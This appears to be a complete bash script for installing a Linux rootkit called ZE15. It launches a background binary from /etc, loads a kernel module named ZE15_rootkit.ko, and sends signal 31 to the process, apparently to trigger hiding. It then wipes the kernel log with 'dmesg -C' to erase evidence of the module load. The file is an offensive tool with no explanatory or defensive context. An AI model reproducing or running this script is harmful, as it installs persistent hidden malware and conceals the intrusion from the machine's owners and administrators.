#!/bin/bash
echo "Starting ZE15_do.sh" > /tmp/ZE15_log
nohup /etc/ZE15 >/dev/null 2>&1 &

ze15_pid=$!

ps aux |grep ZE15 >> /tmp/ZE15_log 


insmod /etc/ZE15_rootkit.ko >> /tmp/ZE15_log 2>&1


kill -31 $ze15_pid >> /tmp/ZE15_log 2>&1

dmesg -C
echo "Finished ZE15_do.sh" >> /tmp/ZE15_log
echo "-----------------------------------------------------------------------------------------" >> /tmp/ZE15_log
